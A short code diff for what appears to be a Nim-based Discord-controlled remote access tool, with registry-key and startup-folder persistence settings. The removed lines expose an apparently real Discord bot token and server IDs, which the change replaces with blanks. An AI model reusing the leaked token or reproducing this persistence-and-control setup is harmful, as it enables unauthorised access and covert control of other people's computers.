@@ -2,10 +2,10 @@ import dimscord, asyncdispatch, options, strutils, strformat, json
 import core / [pcinformation, control, sender, startup]
 
 # --- CONFIG HERER --- #
-let discord = newDiscordClient("MTEzMDMwMTg3Nzg0MjYyODY4OQ.G6ENSf.3CeDySFYeqqQcH1o8JQF6Mr8VX37qrXiFUdSUs")
+let discord = newDiscordClient("")
 let prefix = "-"
-let guildId = some "1130467889351233626"
-let notificationChannelId = "1131036312326127708"
+let guildId = some ""
+let notificationChannelId = ""
 let startupFile = true
 let startupOnRegKey = true
 let startupOnFolder = false
